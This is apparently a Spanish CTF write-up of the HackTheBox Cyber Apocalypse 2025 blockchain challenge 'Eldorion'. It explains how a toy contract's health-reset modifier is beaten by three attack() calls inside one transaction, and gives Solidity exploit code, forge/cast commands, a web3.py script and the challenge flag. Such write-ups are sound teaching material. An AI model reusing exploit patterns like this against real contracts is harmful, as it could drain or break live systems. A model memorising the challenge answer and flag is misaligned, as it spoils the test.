---
title: "Eldorion - Cyber Apocalypse 2025"
layout: post
permalink: /writeups/cyberapocalypse2025/eldorion
date: 2025-03-28 14:00:00 +0000
categories: [HacktheBox, CTF]
tags: [CyberApocalypse, HTB, Blockchain, SmartContracts]
image:
  path: /assets/img/cabeceras_genericas/cyberapocalypse2025.png
  alt: Cyber Apocalypse 2025 - HackTheBox
description: >
  Resolución del reto Eldorion de la categoría Blockchain durante el CTF HackTheBox Cyber Apocalypse 2025.
pin: false
toc: true
math: false
mermaid: false
---

# Eldorion

---

## Resumen

Un reto sencillo donde el jugador debe escribir un contrato inteligente tipo multicall que interactúe con el contrato `Eldorion` para encajar múltiples llamadas de función dentro de la misma transacción.

---

## Descripción

> Bienvenido a los reinos de Eldoria, aventurero. Te encuentras atrapado en este misterioso dominio digital y la única manera de escapar es superando las pruebas que se te presentan.  
Pero tu viaje apenas ha comenzado y ya te encuentras con un obstáculo abrumador en tu camino. Antes de llegar a la ciudad más cercana, en busca de aliados e información, debes enfrentarte a **Eldorion**, una colosal bestia con aterradores poderes regenerativos. Esta criatura, conocida por su "resiliencia eterna", custodia el único paso adelante. Está claro: ***debes*** derrotar a Eldorion para continuar tu aventura.

---

## Conocimientos necesarios

- Comprensión básica de Solidity y contratos inteligentes
- Interacción con contratos inteligentes

## Conocimientos adquiridos

- Interacción con contratos inteligentes
- Crear contratos inteligentes para agrupar múltiples llamadas en una sola transacción

---

## Escenario del reto

Nos proporcionan algunos archivos adjuntos y dos puertos para interactuar.

Al navegar por los pares `url:puerto` observamos que:
- Uno es para conexiones TCP
- El otro es un servidor web HTTP que responde con “rpc is running!”

Conectándonos al puerto TCP mediante netcat obtenemos información de conexión para poder interactuar con el entorno del reto. Seleccionando la opción `1 - Get connection informations` obtenemos:
- Private key del jugador
- Dirección del jugador
- Dirección del contrato objetivo
- Dirección de un contrato llamado `Setup`

---

## Análisis del código fuente

### `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Eldorion } from "./Eldorion.sol";

contract Setup {
    Eldorion public immutable TARGET;
    
    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new Eldorion();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return TARGET.isDefeated();
    }
}
```

En los adjuntos efectivamente tenemos un contrato llamado `Setup.sol` que simplemente despliega el contrato objetivo (`Eldorion.sol`) y define la función `isSolved()` que es la que usará el checker para comprobar si se cumplen las condiciones que nos darán la flag.  
En particular, la única condición es que la función `isDefeated()` del contrato `Eldorion` devuelva `true`.

---

### `Eldorion.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Eldorion {
    uint256 public health = 300;
    uint256 public lastAttackTimestamp;
    uint256 private constant MAX_HEALTH = 300;
    
    event EldorionDefeated(address slayer);
    
    modifier eternalResilience() {
        if (block.timestamp > lastAttackTimestamp) {
            health = MAX_HEALTH;
            lastAttackTimestamp = block.timestamp;
        }
        _;
    }
    
    function attack(uint256 damage) external eternalResilience {
        require(damage <= 100, "Mortals cannot strike harder than 100");
        require(health >= damage, "Overkill is wasteful");
        health -= damage;
        
        if (health == 0) {
            emit EldorionDefeated(msg.sender);
        }
    }

    function isDefeated() external view returns (bool) {
        return health == 0;
    }
}
```

La función `isDefeated()` solo devolverá `true` si la vida (`health`) de Eldorion es `0`.

Sin embargo, la función `attack()`:
- Permite disminuir hasta **100 puntos** de vida por cada llamada.
- Está protegida por el modificador `eternalResilience`, que **restaura la vida a 300** si `block.timestamp > lastAttackTimestamp`.

Es decir:
- Cada vez que ejecutamos `attack()` desde una transacción normal (EOA), el `block.timestamp` será distinto, por lo que Eldorion siempre se curará antes de aplicar el daño.

---

## Explotación

Este comportamiento es una limitación conocida de las EOAs (Externally Owned Accounts), pero se puede evitar fácilmente usando un contrato inteligente.

Un contrato puede hacer varias llamadas en la **misma transacción**, por lo que todos los `attack()` ocurren dentro del mismo bloque con el mismo `block.timestamp`, evitando que `eternalResilience()` restaure la vida entre ataques.

La solución es atacar tres veces en la misma transacción:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Eldorion } from "./Eldorion.sol"; 

contract Exploit {
    function win(address _target) public {
        Eldorion eldorion = Eldorion(_target);
        eldorion.attack(100);
        eldorion.attack(100);
        eldorion.attack(100);

        require(eldorion.isDefeated(), "Eldorion is not defeated");
    }
}
```

---

### Despliegue y ejecución

```bash
forge build
forge create src/Exploit.sol:Exploit --rpc-url $RPC --private-key $PVK
cast send $EXPLOIT "win(address)" $TARGET --rpc-url $RPC --private-key $PVK
```

Con esto, Eldorion queda derrotado.

---

## Validación

Conectándonos nuevamente al sistema:

```bash
nc $IP $PORT
1 - Get connection information
2 - Restart instance
3 - Get flag
```

Y al elegir la opción 3 nos dará la flag.

```
HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}
```

---

## Alternativa con `web3.py`

```python
Exploit = w3.eth.contract(abi=exploit_abi, bytecode=exploit_bytecode)
Exploit.constructor().build_transaction({...})
exploit_contract = w3.eth.contract(address=exploit_addr, abi=exploit_abi)
exploit_contract.functions.win(target_addr).build_transaction({...})
```

---

## Bonus

La limitación de no poder hacer batch de transacciones desde una EOA ha sido discutida durante años, dando lugar a la propuesta [EIP-7702](https://eips.ethereum.org/EIPS/eip-7702) que, en esencia, permitirá:

- Realizar **batch transactions**.
- Tener **transacciones patrocinadas** (relayers).
- Recuperación social mediante **Account Abstraction**.

Actualmente, la EIP-7702 está en pruebas en la testnet de Sepolia y se incluirá en la [Pectra Upgrade](https://ethereum.org/en/roadmap/pectra/).

---

## Script completo

```python
from solcx import install_solc, set_solc_version
install_solc("0.8.28")
set_solc_version("0.8.28")

from web3 import Web3
from solcx import compile_source

# Configuración RPC
w3 = Web3(Web3.HTTPProvider("RPC_PROVIDER_URL"))
assert w3.is_connected()

# Cuenta
private_key = "PLAYER_PRIVATE_KEY"
account = w3.eth.account.from_key(private_key)
w3.eth.default_account = account.address

# Dirección del contrato
eldorion_address = Web3.to_checksum_address("CONTRACT_ADDRESS")

# Código fuente del Slayer
source_code = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IEldorion {
    function attack(uint256 damage) external;
}

contract Slayer {
    IEldorion public eldorion;

    constructor(address _eldorion) {
        eldorion = IEldorion(_eldorion);
    }

    function slay() external {
        eldorion.attack(100);
        eldorion.attack(100);
        eldorion.attack(100);
    }
}
'''

# Compilar
compiled = compile_source(source_code)
contract_interface = compiled['<stdin>:Slayer']

Slayer = w3.eth.contract(abi=contract_interface['abi'], bytecode=contract_interface['bin'])

# Deploy
tx = Slayer.constructor(eldorion_address).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 300000,
    'gasPrice': w3.to_wei('1', 'gwei'),
})
signed_tx = w3.eth.account.sign_transaction(tx, private_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f"[+] Slayer desplegado en {tx_receipt.contractAddress}")

# Ejecutar slay()
slayer = w3.eth.contract(address=tx_receipt.contractAddress, abi=contract_interface['abi'])
tx2 = slayer.functions.slay().build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 300000,
    'gasPrice': w3.to_wei('1', 'gwei'),
})
signed_tx2 = w3.eth.account.sign_transaction(tx2, private_key)
tx_hash2 = w3.eth.send_raw_transaction(signed_tx2.raw_transaction)
tx_receipt2 = w3.eth.wait_for_transaction_receipt(tx_hash2)
print("[+] slay() ejecutado con éxito!")
```

---